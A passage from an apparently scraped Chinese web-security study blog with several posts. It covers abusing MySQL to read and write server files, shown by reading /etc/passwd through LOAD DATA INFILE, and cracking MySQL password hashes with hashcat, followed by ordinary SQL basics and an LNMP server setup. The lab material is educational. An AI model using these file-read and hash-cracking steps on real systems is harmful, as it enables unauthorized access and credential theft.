/etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinuuidd:x:105:111::/run/uuidd:/usr/sbin/nologinavahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologinusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologindnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinrtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologincups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologinspeech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/falsewhoopsie:x:112:117::/nonexistent:/bin/falsekernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologinsaned:x:114:119::/var/lib/saned:/usr/sbin/nologinpulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologinavahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologincolord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologinhplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/falsegeoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologingnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/falsegdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/falseca0y1h:x:1000:1000:ca0y1h,,,:/home/ca0y1h:/bin/bashmysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/false 执行命令 注意： 该方法只能在本地使用，远程连接时无法使用system 无法越权使用 load_file()与load data file load_file()与load data file读取文件的原理都是一样的：新建一个表，读取文件为字符串形式插入表中后读取表中的数据。 使用load_file()和load data infile()函数时，需要满足以下条件： secure_file_priv 不为 NULL，使用 select @@secure_file_priv查看其值，值不为空字符串时，只能使用该目录进行文件的读写操作， 该值的设置见[附录](https://bingslient.github.io/2019/08/16/MySQL 数据库系统表的利用/#附录)； 当前数据库用户具有 FILE 权限，使用 show grants查看； 系统用户 mysql 对该文件可读（要考虑系统的访问控制策略），在Ubuntu-18.04使用 MySQL 时默认的系统用户是 mysql； 读取文件的大小小于 max_allowed_packet，使用 select @@max_allowed_packet查看； 文件存在服务器上。 如果上述任一条件不满足，函数返回 NULL 值。 查看secure_file_priv的值： 可以看到secure_file_priv的值为/var/lib/mysql-files ① secure_file_priv为NULL时，表示不允许导入导出； ② secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹； ③ secure_file_priv没有设置时，则表示没有任何限制 在不改变secure_file_priv值的情况下如何读文件： 可以新建一个表，或者直接把要读文件的内容into到已有的字符类型的表中。 1create table mytable(a VARCHAR(100), b VARCHAR(100), c VARCHAR(100), d VARCHAR(100), e VARCHAR(100), f VARCHAR(100), g VARCHAR(100)); 使用load data infile读取文件： 1LOAD DATA LOCAL INFILE &quot;&#x2F;etc&#x2F;passwd&quot; INTO TABLE mytable; 查看刚刚读入的文件： 在改变secure_file_priv值的情况下如何读文件： 修改MySQL配置文件etc/mysql/my.cnf，在[mysqld]下添加如下内容： 1secure_file_priv&#x3D;&quot;&quot; 再重启mysql服务： 1sudo service mysql restart 在mysql命令行中查看secure_file_priv的值： 修改成功！ 使用load_file()读取文件： 在Ubuntu-18.04使用 MySQL 时默认的系统用户是 mysql，所以必须把要读取的文件的所有者和用户组修改为mysql 二、利用数据库写入文件 SELECT INTO OUTFILE 和 LOAD DATA 这两条语句是完全互补的，一个写文件，一个读文件，语句的语法也很相似。 前提条件： secure_file_priv 不为 NULL，使用 select @@secure_file_priv查看其值，值不为空字符串时，只能使用该目录进行文件的读写操作， 该值的设置见[附录](https://bingslient.github.io/2019/08/16/MySQL 数据库系统表的利用/#附录)； 当前数据库用户具有 FILE 权限，使用 show grants查看； 系统用户 mysql 对该文件可写（要考虑系统的访问控制策略），在Ubuntu-18.04使用 MySQL 时默认的系统用户是 mysql； 读取文件的大小小于 max_allowed_packet，使用 select @@max_allowed_packet查看； 文件不存在。 将数据库中的某一个记录写入/tmp/customer.csv文件中： 结果如下： 使用 SELECT INTO DUMPFILE 可将文件内容写成一行。 如果想把远程数据库的查询结果写到本地主机文件上, 可用： 1&gt;mysql -h hostname -P portnum -u username -p databsename -e &quot;SELECT ...&quot; &gt; file_name 0x03 用户密码爆破 MySQL 用户的密码存储方式并非明文直接存储，而是经过 hash 函数加密进行存储的，从 mysql.user中获取到 MySQL 用户密码的哈希值后，需要使用工具进行破解。 首先查询root用户密码的Hash值： 工具：hashcat hashcat 号称最快的高级密码恢复套机（密码破解工具），支持多系统（Linux，OS，Windows），多平台（GPU，CPU，DSP等），支持多达 200 多种的 Hash 类型，支持使用同一系统的不同设备，支持分布式系统资源等，重要的是开源啊！ 使用： 1./hashcat64.exe -m 300 -a 3 hashcode -o plaintxt --outfile-format=2 ?a?a?a?a?a?a 参数解释： -m 300：hash 类型，300 选择的是 MySQL4/5 的hash -a 3：攻击模式，3代表爆破模式 软件一共支持5种破解模式，分别为: 0 Straight（字典破解） 1 Combination（组合破解） 3 Brute-force（掩码暴力破解） 6 Hybrid dict + mask（混合字典+掩码） 7 Hybrid mask + dict（混合掩码+字典） -o pliantxt ：破解后输出到文件 plaintxt --outfile-format=2：输出文件格式，2表示只输出破解后的内容 ?a?a?a?a?a?a：这表示密码的掩码，所谓的掩码就是通过 ?[字符集代号]… 的格式表示密码的格式，包括密码的位数和每一位密码使用的字符集。?a 表示所有的键盘上可输入的字符，6个?a表示密码有6位。 hashcat 内置字符集如下： ?l = abcdefghijklmnopqrstuvwxyz ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d = 0123456789 ?h = 0123456789abcdef ?H = 0123456789ABCDEF ?s = !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{ ?a = ?l?u?d?s ?b = 0x00 - 0xff 如果要用掩码表示小写+数字怎么办呢？这就需要用到自定义字符集这个参数了。软件支持用户最多定义4组字符集，分别用 1234--custom-charset1 [chars]--custom-charset2 [chars]--custom-charset3 [chars]--custom-charset4 [chars] 比如说我要设置自定义字符集1为小写+数字，那么就加上: 1-- custom-charset1 ?l?d 对于想要破解一些未知长度的密码，希望软件在一定长度范围内进行尝试的，可以使用–increment参数，并且使用–increment-min ?定义最短长度，使用–increment-max ?定义最大长度。比如要尝试6-8位小写字母，可以这样写： 1--increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l 爆破结果： 最新版本的MySQL在配置密码规则是要求密码长度最小为8位，但是我这破电脑用hashcat爆破8位密码预计需要1年的时间，只能强行把密码最小长度改为6位，15分钟解决问题。","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"MySQL","slug":"MySQL","permalink":"http://ca0y1h.top/tags/MySQL/"},{"name":"hash爆破","slug":"hash爆破","permalink":"http://ca0y1h.top/tags/hash%E7%88%86%E7%A0%B4/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Web安全学习之MySQL基本操作","date":"2019-08-11T12:24:26.000Z","path":"Web_security/basic_learning/2.MySQL基本操作/","text":"Web安全学习之MySQL基本操作 主要以《MySQL必知必会》（《MySQl Crash Course》）为参考 任务目标 什么是关系型和⾮关系型数据库 选择⼀种关系型数据库进⾏学习 学习数据库中的字段类型并创建库和⽤⼾表，需要包含所有字段类型 学习数据库的增删改查，记录学习过程 0x01 SQL&amp;NoSQL 关系型数据库 关系型数据库是以关系模型来创建的数据库。 关系模型就是指二维表格模型。 一个关系型数据库就是由二维表及其之间的联系组成的一个数据组织。 常见的关系型数据库有： Mysql、Oracle、PostgreSQL、SQLServer、MicrosoftAccess 非关系型数据库 非关系型数据库是以非关系模型来创建的数据库。 非关系模型有列模型、键值对模型、文档类模型。 常见的关系型数据库有： MongoDB、Redis、MemcacheDB、HBase 0x02 数据类型 名称 类型 说明 INT 整型 4字节整数类型，范围约+/-21亿 BIGINT 长整型 8字节整数类型，范围约+/-922亿亿 REAL 浮点型 4字节浮点数，范围约+/-1038 DOUBLE 浮点型 8字节浮点数，范围约+/-10308 DECIMAL(M,N) 高精度小数 由用户指定精度的小数，例如，DECIMAL(20,10)表示一共20位，其中小数10位，通常用于财务计算 CHAR(N) 定长字符串 存储指定长度的字符串，例如，CHAR(100)总是存储100个字符的字符串 VARCHAR(N) 变长字符串 存储可变长度的字符串，例如，VARCHAR(100)可以存储0~100个字符的字符串 BOOLEAN 布尔类型 存储True或者False DATE 日期类型 存储日期，例如，2018-06-22 TIME 时间类型 存储时间，例如，12:20:59 DATETIME 日期和时间类型 存储日期+时间，例如，2018-06-22 12:20:59 0x03 样例表设计 vendors表 vendors表存储销售产品的供应商。每个供应商在这个表中有一个记录，供应商ID（vend_id）列用来匹配产品和供应商。 列 说明 vend_id 供应商ID vend_name 供应商名 vend_address 供应商的地址 vend_city 供应商的城市 vend_state 供应商的州 vend_zip 供应商的邮政编码 vend_country 供应商的国家 products表 products表包含产品目录，每行一个产品。每个产品有唯一的ID（prod_id列），通过vend_id（供应商的唯一ID）关联到它的供应商。 列 说明 prod_id 产品ID vend_id 产品供应商ID prod_name 产品名 prod_price 产品价格 prod_desc 产品描述 customers表 customers表存储所有顾客的信息。每个顾客有唯一的ID（cust_id列）。 列 说明 cust_id 顾客ID cust_name 顾客姓名 cust_address 顾客的地址 cust_city 顾客的城市 cust_state 顾客的州 cust_zip 顾客的邮政编码 cust_country 顾客的国家 cust_contact 顾客的联系方式 cust_email 顾客的邮箱 orders表 orders表存储顾客订单（但不是订单细节）。每个订单唯一地编号（order_num列）。订单用cust_id列（它关联到customer表的顾客唯一ID）与相应的顾客关联。 列 说明 order_num 唯一订单号 order_date 订单日期 cust_id 订单顾客ID orderitems表 orderitems表存储每个订单中的实际物品，每个订单的每个物品占一行。对orders中的每一行，orderitems中有一行或多行。每个订单物品由订单号加订单物品（第一个物品、第二个物品等）唯一标识。订单物品通过order_num列（关联到orders中订单的唯一ID）与它们相应的订单相关联。此外，每个订单项包含订单物品的产品ID（它关联物品到products表） 列 说明 order_num 订单号（关联到orders表的order_num） order_item 订单物品号（在某个订单中的顺序） prod_id 产品ID（关联到products表的prod_id） quantity 物品数量 item_price 物品价格 productnotes表 productnotes表存储与特定产品有关的注释。并非所有产品都有相关的注释，而有的产品可能有许多相关的注释。 列 说明 note_id 注释ID prod_id 产品ID note_date 增加注释的日期 note_text 注释的内容 0x04 样例表创建 附件中包含两个可以执行的SQL脚本文件。 create.sql包含创建6个数据库表（包括所有主键和外键约束）的MySQL语句。 populate.sql包含用来填充这些表的INSERT语句。 然后按照以下步骤创建样例表 创建一个新的数据库 选择新数据源（如果使用mysql命令行实用程序，用USE命令） 执行create.sql脚本和populate.sql脚本。如果使用mysql命令行实用程序，可给出 source create.sql;（指定create.sql文件的完全路径） 0x05 简单检索数据 单个列：SELECT prod_name FROM products; 多个列：SELECT pro_id, prod_name, prod_price FROM products; 所有列：SELECT * FROM products; 不同值的行：SELECT DISTINCT vend_id FROM products; 指定某一区间的行：SELECT prod_name FROM products LIMIT 5 OFFSET 5; 0x06 排序检索数据 按单列排序数据：SELECT prod_name FROM products ORDER_BY prod_name; 按多列排序数据：SELECT prod_id, prod_price, prod_name FROM products ORDER BY prod_price DESC, prod_name; 指定prod_price降序排列，prod_name升序排列。 求最大值或最小值：SELECT prod_price FROM products ORDER BY prod_price DESC limit 1; 0x07 过滤数据 （ORDER BY子句位于WHERE子句后面） 操作符类型：=, &lt;&gt;, &lt;, &lt;=, &gt;, &gt;=, BETWEEN, IS NULL, AND, OR 其中AND操作符的优先级大于OR操作符，例如：SELECT prod_name, prod_price FROM products WHERE vend_id = 1002 OR vend_id = 1003 AND prod_price &gt;= 10; 其结果为： IN操作符：SELECT prod_name, prod_price FROM products WHERE vend_id IN (1002, 1003); IN操作符与OR操作符的作用相当，但是IN操作符有以下几点优势： IN操作符的语法更直观简洁； IN操作符一般比OR操作符执行更快； IN操作符最大优点是可以包含其他SELECT语句，使得能够更动态的创建WHERE子句。 0x08 通配符 百分号（%）通配符：SELECT prod_id, prod_name FROM products WHERE prod_name LIKE '%anvil%'; 注意：%通配符无法匹配NULL；%通配符还能匹配0个字符。 下划线（_）通配符：用途跟%通配符一样，但是_通配符只能匹配单个字符。 0x09 创建计算字段 拼接字段（Concat()函数）：SELECT Concat(vend_name, '(' , vend_country, ')') FROM vendors ORDER BY vend_name; Trim()函数：删除数据两侧多余的空格来整理数据 SELECT Concat(RTrim(vend_name), '(', RTrim(vend_country), ')' ) FROM vendors ORDER BY vend_name; 使用别名：SELECT Concat(vend_name, '(' , vend_country, ')') AS vendor_title FROM vendors ORDER BY vend_name; 算术计算：SELECT prod_id, quantity, item_price, quantity*item_price AS expanded_price FROM orderitems WHERE order_num = 20005; 0x0A 汇总数据 五种聚集函数： AVG():返回某列的平均值 SELECT AVG(prod_price) AS avg_price FROM products WHERE vend_id = 1003; COUNT():返回某列的行数 用法1：COUNT(*)对表中行的数目进行计数，不管表列中包含的是空值（NULL）还是非空值； SELECT COUNT(*) AS num_cust FROM customers; 用法2：COUNT(column)对特定列中具有值的行进行计数，忽略NULL值。 `SELECT COUNT(cust_email) AS num_cust FROM customers; MAX():返回指定列中的最大值（忽略值为NULL的行） SELECT MAX(prod_price) AS max_price FROM products; MIN():返回指定列中的最小值（忽略值为NULL的行） SELECT MIN(prod_price) AS mIin_price FROM products; SUM():返回指定列值的和 SELECT SUM(quantity*item_price) AS total_price FROM orderitems WHERE order_num = 20005; 聚集不同值 以上的五个聚集函数都可以如下使用： 对所有行执行计算指定ALL参数或不给参数（ALL是默认行为） 只包含不同的值，指定DISTINCT参数 SELECT AVG(DISTINCT prod_price) AS avg_price FROM products WHERE vend_id = 1003; 组合聚集函数 12345SELECT COUNT(*) AS num_itemsMIN(prod_price) AS price_min,MAX(prod_price) AS price_max,AVG(prod_price) AS price_avg,FROM products; 0x0B 分组数据 创建分组 SELECT vend_id, COUNT(*) AS num_prods FROM products GROUP BY vend_id; GROUP BY子句指示MySQL按vend_id排序并且分组数据，这导致对每个vend_id而不是整张表计算num_prods一次。 注意事项： GROUP BY 子句中列出的每个列都必须是检索列或有效的表达式 (但不能是聚集函数)。如果在 SELECT 中使用表达式,则必须在 GROUP BY 子句中指定相同的表达式，不能使用别名。 除聚集计算语句外, SELECT 语句中的每个列都必须在 GROUP BY 子 句中给出给出相应的列名。 如果分组列中具有 NULL 值,则 NULL 将作为一个分组返回。如果列 中有多行 NULL 值,它们将分为一组。 GROUP BY 子句必须出现在 WHERE 子句之后, ORDER BY 子句之前。 过滤分组 SELECT cust_id, COUNT(*) AS orders FROM orders GROUP BY cust_id HAVING COUNT(*) &gt;= 2; HAVING 非常类似于 WHERE 。事实上,目前为止所学过的所有类型的 WHERE 子句都可以用 HAVING 来替代。唯一的差别是WHERE 过滤行,而 HAVING 过滤分组。 WHERE 和 HAVING的差别：WHERE在数据分组前进行过滤，HAVING在数据分组后进行过滤。SELECT vend_id, COUNT(*) AS num_prods FROM products WHERE prod_price &gt;= 10 GROUP BY vend_id HAVING COUNT(*) &gt;=2; WHERE 子句过滤所有 prod_price 至少为 10 的行。然后按 vend_id 分组数据, HAVING 子句过滤计数为 2 或 2 以上的分组。如果没有 WHERE 子句,将会多检索出两行(供应商 1002 ,销售的所有产品价格都在 10 以下;供应商 1001 ,销售3个产品,但只有一个产品的价格大于等于 10 )。 SELECT vend_id, COUNT(*) AS num_prods FROM products GROUP BY vend_id HAVING COUNT(*) &gt;=2; SELECT子句顺序 SELECT----------FROM----------WHERE----------GROUP BY----------HAVING----------ORDER BY----------LIMIT 0x0C 插入数据 123456789101112131415INSERT INTO customers(cust_name, cust_address, cust_city, cust_zip, cust_country, cust_contact, cust_email) VAlUSE(&#x27;Pep E. LaPew&#x27;, &#x27;100 Main Street&#x27;, &#x27;Los Angeles&#x27;, &#x27;CA&#x27;, &#x27;90046&#x27;, &#x27;USA&#x27;, NULL, NULL); 在插入行时，MySQL将用VALUES列表中的相应值填入列表中的对应项。VALUES中的第一个值对应于第一个指定的列名。第二个值对应于第二个列名，如此等等。 因为提供了列名，VALUES必须以其指定的次序匹配指定的列名，不一定按各个列出现在实际表中的次序。 0x0D 更新和删除数据 更新数据 基本的UPDATE语句由3部分组成，分别是： 要更新的表； 列名和它们的新值； 确定要更新行的过滤条件。 例如： 123UPDATE customersSET cust_email = &#x27;elmer@fudd.com&#x27;WHERE cust_id = 10005; 为了删除某个列的值，可设置它为NULL（假如表定义允许NULL值）。 123UPDATE customersSET cust_email = NULLWHERE cust_id = 10005; 删除数据 下面的语句从customers表中删除一行： 12DELETE FROM customersWHERE cust_id &#x3D; 10006;","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"MySQL","slug":"MySQL","permalink":"http://ca0y1h.top/tags/MySQL/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Web安全学习之Ubuntu18.04安装LNMP","date":"2019-08-03T14:13:37.000Z","path":"Web_security/basic_learning/1.在Ubuntu18.04安装LNMP/","text":"本周目标 任务目标：准备学习环境，搭建Web服务器，并做相应的服务器加固学习 推荐环境：linux+nginx+php-fpm+mysql 预期结果：能够运行 php 代码并且可以使用 php 连接 mysql，成功执行 mysql 的语句 拓展实验：可以搭建基于 Apache 的环境、基于 Windows Server 的 IIS 环境等 基本环境 VMware Workstation Player 15 Ubuntu 18.04.2 LTS 环境搭建 安装Nginx Install Nginx 12sudo apt updatesudo apt install nginx 使用下面命令查看是否安装成功： 1sudo service nginx status 如果Nginx启动成功，会有如下显示： 123456789● nginx.service - A high performance web server and a reverse proxy server Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: en Active: active (running) since Sat 2019-07-27 13:12:44 CST; 39s ago Docs: man:nginx(8) Main PID: 5836 (nginx) Tasks: 2 (limit: 3433) CGroup: /system.slice/nginx.service ├─5836 nginx: master process /usr/sbin/nginx -g daemon on; master_pro └─5837 nginx: worker process Configure Firewall ubuntu官方文档有对ufw进行简单的介绍 配置ufw允许ssh、http、https连接： 123sudo ufw allow sshsudo ufw allow httpsudo ufw allow https 启动ufw： 1sudo ufw enable 使用下面命令检查防火墙状态： 123456789101112sudo ufw statusStatus: activeTo Action From-- ------ ----22/tcp ALLOW Anywhere 80/tcp ALLOW Anywhere 443/tcp ALLOW Anywhere 22/tcp (v6) ALLOW Anywhere (v6) 80/tcp (v6) ALLOW Anywhere (v6) 443/tcp (v6) ALLOW Anywhere (v6) 在这里，可以看到端口22（SSH），80（https）和443（https）对IPv4和IPv6都是开放的。 centos7 firewalld操作： 添加 firewall-cmd --zone=public --add-port=80/tcp --permanent （–permanent永久生效，没有此参数重启后失效） 重新载入 firewall-cmd --reload 查看 firewall-cmd --zone=public --query-port=80/tcp 删除 firewall-cmd --zone=public --remove-port=80/tcp --permanent 查看所有开放的端口 firewall-cmd --zone=public --list-ports Test Nginx 使用ifconfig查看本机IP地址192.168.11.131 在浏览器中访问本机IP地址http://192.168.11.131/： 安装MySQL Install MySQL 输入以下命令安装MySQL： 1sudo apt install mysql-server 可以按如下方式测试MySQL服务器： 123456789101112131415161718192021222324sudo mysqlWelcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 2Server version: 5.7.27-0ubuntu0.18.04.1 (Ubuntu)Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &#x27;help;&#x27; or &#x27;\\h&#x27; for help. Type &#x27;\\c&#x27; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys |+--------------------+4 rows in set (0.00 sec) Configure MySQL Security 默认情况下，MySQL服务器只有一个用户：root。如果您是Linux系统上的root用户并执行mysql命令，则只能使用此用户登录数据库，无需输入密码，也不需要输入密码。 为了确保安装，MySQL附带了一个脚本，该脚本将询问我们是否要修改一些不安全的默认值。键入以下命令启动脚本： 1sudo mysql_secure_installation 此脚本将询问您是否要配置VALIDATE PASSWORD PLUGIN： 123456789101112ca0y1h@ubuntu18042:~$ sudo mysql_secure_installationSecuring the MySQL server deployment.Connecting to MySQL using a blank password.VALIDATE PASSWORD PLUGIN can be used to test passwordsand improve security. It checks the strength of passwordand allows the users to set only those passwords which aresecure enough. Would you like to setup VALIDATE PASSWORD plugin?Press y|Y for Yes, any other key for No: 输入y，接下来脚本还会要求你选择密码验证级别： 1234567There are three levels of password validation policy:LOW Length &gt;= 8MEDIUM Length &gt;= 8, numeric, mixed case, and special charactersSTRONG Length &gt;= 8, numeric, mixed case, special characters and dictionary filePlease enter 0 = LOW, 1 = MEDIUM and 2 = STRONG: 输入1选择中等密码强度，接下来，系统会要求您提交并确认root密码： 123456New password: Re-enter new password: Estimated strength of the password: 100 Do you wish to continue with the password provided?(Press y|Y for Yes, any other key for No) : y 接下来MySQL脚本将删除一些匿名用户和测试数据库，禁用远程root登录，并加载这些新规则： 1234567891011121314151617181920212223242526By default, a MySQL installation has an anonymous user,allowing anyone to log into MySQL without having to havea user account created for them. This is intended only fortesting, and to make the installation go a bit smoother.You should remove them before moving into a productionenvironment.Remove anonymous users? (Press y|Y for Yes, any other key for No) : ySuccess.--snip--By default, MySQL comes with a database named &#x27;test&#x27; thatanyone can access. This is also intended only for testing,and should be removed before moving into a productionenvironment.--snip--Reloading the privilege tables will ensure that all changesmade so far will take effect immediately.Reload privilege tables now? (Press y|Y for Yes, any other key for No) : ySuccess.All done! 最后需要注意的是，在运行MySQL 5.7（及更高版本）的Ubuntu系统中，如果是以root身份用户启动mysql命令时，根MySQL用户设置为auth_socket默认使用插件进行身份验证，而不是使用密码进行身份验证。如果需要允许外部程序（例如phpMyAdmin）访问用户时，会出现访问受限的情况。 这样就需要将其身份验证方法从切换auth_socket为mysql_native_password，使用以下命令检查每个MySQL用户帐户使用的身份验证方法： 12345678910mysql&gt; SELECT user,authentication_string,plugin,host FROM mysql.user;+------------------+-------------------------------------------+-----------------------+-----------+| user | authentication_string | plugin | host |+------------------+-------------------------------------------+-----------------------+-----------+| root | | auth_socket | localhost || mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost || mysql.sys | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost || debian-sys-maint | *A38295EEEA729FDFC0C36C8E270DDA27005B7693 | mysql_native_password | localhost |+------------------+-------------------------------------------+-----------------------+-----------+4 rows in set (0.00 sec) 运行以下ALTER USER命令，更改password为上述步骤选择的强密码： 1mysql&gt; ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;password&#x27;; 然后，运行FLUSH PRIVILEGES告诉服务器重新加载授权表并使新的更改生效： 1mysql&gt; FLUSH PRIVILEGES; 配置根MySQL用户使用密码进行身份验证后，将无法再sudo mysql使用先前使用的命令访问MySQL 。相反，必须运行以下命令： 1mysql -u root -p 输入刚刚设置的密码后，将看到MySQL提示符。 此时，数据库系统现已设置完毕，接下来继续安装PHP。 安装PHP&amp;配置Nginx Install php-fpm 与Apache不同，Nginx不包含本地PHP处理。为此，我们必须安装PHP-FPM（FastCGI Process Manager）。FPM是另一种PHP FastCGI实现，具有一些对重载站点有用的附加功能。另外还需要安装php-mysql以允许PHP与MySQL数据库通信。 1$ sudo apt install php-fpm php-mysql 查看PHP是否安装成功： 12345$ php --versionPHP 7.2.19-0ubuntu0.18.04.1 (cli) (built: Jun 4 2019 14:48:12) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies with Zend OPcache v7.2.19-0ubuntu0.18.04.1, Copyright (c) 1999-2018, by Zend Technologies Configure Nginx for PHP 现在已经安装了所有必需的LEMP堆栈组件，但仍需要进行一些Nginx配置更改。这是在服务器块级别完成的（服务器块类似于Apache的虚拟主机）。 在/etc/nginx/sites-available/目录中打开新的服务器块配置文件。在此示例中，新服务器块配置文件命名example.com： 1$ sudo vim /etc/nginx/sites-available/example.com 将以下内容（从默认服务器块配置文件中获取并略微修改）添加到新服务器块配置文件中： 12345678910111213141516171819server &#123; listen 80; root &#x2F;var&#x2F;www&#x2F;html; index index.php index.html index.htm index.nginx-debian.html; server_name SERVER_IP_ADDRESS; location &#x2F; &#123; try_files $uri $uri&#x2F; &#x3D;404; &#125; location ~ \\.php$ &#123; include snippets&#x2F;fastcgi-php.conf; fastcgi_pass unix:&#x2F;var&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock; &#125; location ~ &#x2F;\\.ht &#123; deny all; &#125;&#125; 需要注意两个地方： 在index.html前面添加index.php 确保fastcgi_pass 套接字路径是正确的 添加此内容后，保存并关闭该文件。通过从新服务器块配置文件（在/etc/nginx/sites-available/目录中）到/etc/nginx/sites-enabled/目录创建符号链接来启用新服务器块： 1$ sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/ 然后，从/sites-enabled/目录中取消链接默认配置文件： 1$ sudo unlink /etc/nginx/sites-enabled/default 注意：如果您需要恢复默认配置，可以通过重新创建符号链接来执行此操作： 1$ sudo ln -s /etc/nginx/sites-available/default /etc/nginx/sites-enabled/ 以下命令可以测试新配置文件的语法错误： 1$ sudo nginx -t 准备好后，重新加载Nginx的配置文件： 1$ sudo systemctl reload nginx Create a PHP file to Test Configuration 在/var/www/html/下新建info.php文件 1$ sudo vim /var/www/html/info.php 在新文件中写入以下代码： 12&lt;?phpphpinfo(); 现在可以在浏览器中访问http://Server_IP_Address/info.php/，应该看到PHP生成的网页，其中包含有关您的服务器的信息： 验证结果 Connect MySQL 在/var/www/html/建立一个新文件test_sql.php： 1234567891011121314&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;; // 创建连接$conn = new mysqli($servername, $username, $password); // 检测连接if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot; . $conn-&gt;connect_error);&#125; echo &quot;连接成功&quot;;?&gt; 运行结果： Create Database 在上一个步骤的基础上，修改test_sql.php文件： 12345678910111213141516171819202122&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;; // 创建连接$conn = new mysqli($servername, $username, $password);// 检测连接if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot; . $conn-&gt;connect_error);&#125; // 创建数据库$sql = &quot;CREATE DATABASE testPHP&quot;;if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;数据库创建成功&quot;;&#125; else &#123; echo &quot;Error creating database: &quot; . $conn-&gt;error;&#125; $conn-&gt;close();?&gt; 运行结果： Create Table 在上一个步骤的基础上，继续修改test_sql.php文件： 123456789101112131415161718192021222324252627282930&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;$dbname = &quot;testPHP&quot;; // 创建连接$conn = new mysqli($servername, $username, $password, $dbname);// 检测连接if ($conn-&gt;connect_error) &#123; die(&quot;连接失败: &quot; . $conn-&gt;connect_error);&#125; // 使用 sql 创建数据表$sql = &quot;CREATE TABLE VIPMembers (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY, firstname VARCHAR(30) NOT NULL,lastname VARCHAR(30) NOT NULL,email VARCHAR(50),reg_date TIMESTAMP)&quot;; if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;Table MyGuests created successfully&quot;;&#125; else &#123; echo &quot;创建数据表错误: &quot; . $conn-&gt;error;&#125; $conn-&gt;close();?&gt; 运行结果： Insert Record 